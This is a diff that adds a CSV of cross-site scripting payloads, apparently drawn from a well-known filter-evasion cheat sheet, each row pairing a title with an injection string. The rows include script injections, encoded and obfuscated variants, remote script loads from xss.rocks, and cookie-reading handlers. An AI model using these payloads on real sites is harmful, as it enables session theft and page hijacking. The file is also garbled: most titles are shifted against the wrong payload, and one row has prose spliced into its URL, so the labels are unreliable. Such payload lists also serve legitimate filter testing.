@@ -1,0 +1,118 @@
+title,pattern
+XSS Locator,";alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+XSS Locator (short),"';!--""<XSS>=&{()}"
+XSS basic, <script>alert('hyeji')</script>
+No Filter Evasion,<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+Filter bypass based polyglot,""">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->""></script><script>alert(document.cookie)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id)>'""><img src=""http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"">"
+Image XSS using the JavaScript directive ,"<IMG SRC=""javascript:alert('XSS');"">"
+No quotes and no semicolon,<IMG SRC=javascript:alert('XSS')>
+Case insensitive XSS attack vector,<IMG SRC=JaVaScRiPt:alert('XSS')>
+HTML entities,"<IMG SRC=javascript:alert(""XSS"")>"
+Grave accent obfuscation,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>"
+Malformed A tags,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
+Malformed IMG tags,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
+fromCharCode,"<IMG SRC=# onmouseover=""alert('xxs')"">"
+Default SRC tag to get past filters that check SRC domain,"<IMG SRC= onmouseover=""alert('xxs')"">"
+Default SRC tag by leaving it empty,"<IMG onmouseover=""alert('xxs')"">"
+Default SRC tag by leaving it out entirely,"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>"
+On error alert,"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">"
+IMG  onerror and javascript alert encode,"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&#39;&#88;&#83;&#83;&#39;&#41;>"
+Decimal HTML character references,"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
+Decimal HTML character references without trailing semicolons,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+Hexadecimal HTML character references without trailing semicolons,"<IMG SRC=""jav	ascript:alert('XSS');"">"
+Embedded tab,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">"
+Embedded Encoded tab,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">"
+Embedded newline to break up XSS,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">"
+Embedded carriage return to break up XSS,"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out"
+Null breaks up JavaScript directive,"<IMG SRC="" &#14;  javascript:alert('XSS');"">"
+Spaces and meta chars before the JavaScript in images for XSS,"<SCRIPT/XSS SRC=""http://xss.rocks/xss.js""></SCRIPT>"
+Non-alpha-non-digit XSS,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>"
+Extraneous open brackets,"<SCRIPT/SRC=""http://xss.rocks/xss.js""></SCRIPT>"
+No closing script tags,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
+Protocol resolution in script tags,<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+Half open HTML/JavaScript XSS vector,<SCRIPT SRC=//xss.rocks/.j>
+Double open angle brackets,"<IMG SRC=""javascript:alert('XSS')"""
+Escaping JavaScript escapes,<iframe src=http://xss.rocks/scriptlet.html <
+End title tag,"\"";alert('XSS');//"
+INPUT image,</script><script>alert('XSS');</script>
+BODY image,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>"
+IMG Dynsrc,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
+IMG lowsrc,"<BODY BACKGROUND=""javascript:alert('XSS')"">"
+List-style-image,"<IMG DYNSRC=""javascript:alert('XSS')"">"
+VBscript in an image,"<IMG LOWSRC=""javascript:alert('XSS')"">"
+Livescript (older versions of Netscape only),"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>"
+SVG object tag,"<IMG SRC='vbscript:msgbox(""XSS"")'>"
+BODY tag,"<IMG SRC=""livescript:[code]"">"
+Event Handlers,<svg/onload=alert('XSS')>
+BGSOUND,<BODY ONLOAD=alert('XSS')>
+& JavaScript includes,"<BGSOUND SRC=""javascript:alert('XSS');"">"
+STYLE sheet,"<BR SIZE=""&{alert('XSS')}"">"
+Remote style sheet,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">"
+Remote style sheet part 2,"<LINK REL=""stylesheet"" HREF=""http://xss.rocks/xss.css"">"
+Remote style sheet part 3,<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+Remote style sheet part 4,"<META HTTP-EQUIV=""Link"" Content=""<http://xss.rocks/xss.css>; REL=stylesheet"">"
+STYLE tags with broken up JavaScript for XSS,"<STYLE>BODY{-moz-binding:url(""http://xss.rocks/xssmoz.xml#xss"")}</STYLE>"
+STYLE attribute using a comment to break up expression,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>"
+IMG STYLE with expression,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">"
+STYLE tag (Older versions of Netscape only),"exp/*<A STYLE='no\\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>"
+STYLE tag using background-image,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>"
+STYLE tag using background,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>"
+Anonymous HTML with STYLE attribute,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>"
+Local htc file,"<XSS STYLE=""xss:expression(alert('XSS'))"">"
+US-ASCII encoding,"<XSS STYLE=""behavior: url(xss.htc);"">"
+META,¼script¾alert(¢XSS¢)¼/script¾
+META using data,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">"
+META with additional URL parameter,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"
+IFRAME,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">"
+IFRAME Event based,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"
+FRAME,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>"
+TABLE,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>"
+TD,"<TABLE BACKGROUND=""javascript:alert('XSS')"">"
+DIV,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">"
+DIV background-image,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">"
+DIV background-image with unicoded XSS exploit,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">"
+DIV background-image plus extra characters,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">"
+DIV expression,"<DIV STYLE=""width: expression(alert('XSS'));"">"
+Downlevel-Hidden block,"<!--[if gte IE 4]>
+ <SCRIPT>alert('XSS');</SCRIPT>
+ <![endif]-->"
+BASE tag,"<BASE HREF=""javascript:alert('XSS');//"">"
+OBJECT tag," <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://xss.rocks/scriptlet.html""></OBJECT>"
+Using an EMBED tag you can embed a Flash movie that contains XSS,"EMBED SRC=""http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=""never"" and allownetworking=""internal"" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf"" AllowScriptAccess=""always""></EMBED>"
+You can EMBED SVG which can contain your XSS vector,"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>"
+Using ActionScript inside flash can obfuscate your XSS vector,"a=""get"";b=""URL(\"""";c=""javascript:"";d=""alert('XSS');\"")"";eval(a+b+c+d);"
+XML data island with CDATA obfuscation,"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
+Locally hosted XML with embedded JavaScript that is generated using an XML data island,"<XML SRC=""xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>"
+HTML+TIME in XML,"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert(""XSS"")</SCRIPT>""></BODY></HTML>"
+"Assuming you can only fit in a few characters and it filters against "".js""","<SCRIPT SRC=""http://xss.rocks/xss.jpg""></SCRIPT>"
+SSI (Server Side Includes),"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'""-->"
+PHP,"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>"
+IMG Embedded commands,"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">"
+IMG Embedded commands part II,Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Cookie manipulation,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
+UTF-7 encoding(1)," <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> "
+UTF-7 encoding(2),</HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+XSS using HTML quote encapsulation,"<SCRIPT a="">"" SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+URL string evasion,"<SCRIPT ="">"" SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+IP verses hostname,"<SCRIPT a="">"" '' SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+URL encoding,"<SCRIPT ""a='>'"" SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+Dword encoding,"<SCRIPT a=`>` SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+Hex encoding,"<SCRIPT a="">'>"" SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+Octal encoding,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""httx://xss.rocks/xss.js""></SCRIPT>"
+Mixed encoding,"<A HREF=""http://66.102.7.147/"">XSS</A>"
+Protocol resolution bypass,"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>"
+"Google ""feeling lucky"" part 1.","<A HREF=""http://1113982867/"">XSS</A>"
+"Google ""feeling lucky"" part 2.","<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>"
+"Google ""feeling luc
+ky"" part 3.","<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>"
+Removing cnames,"<A HREF=""http://66.000146.07.147/"">XSS</A>"
+Extra dot for absolute DNS:,"<A HREF=""//www.google.com/"">XSS</A>"
+JavaScript link location:,"<A HREF=""//google"">XSS</A>"
+Content replace as attack vector,"<A HREF=""http://ha.ckers.org@google"">XSS</A>"
+Character escape sequences,"<A HREF=""http://google:ha.ckers.org"">XSS</A>"
+Methods to Bypass WAF ??Cross-Site Scripting,"<A HREF=""http://google.com/"">XSS</A>"
+Character Encoding and IP Obfuscation Calculators,"<A HREF=""http://www.google.com./"">XSS</A>"
+Authors and Primary Editors,"<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>"
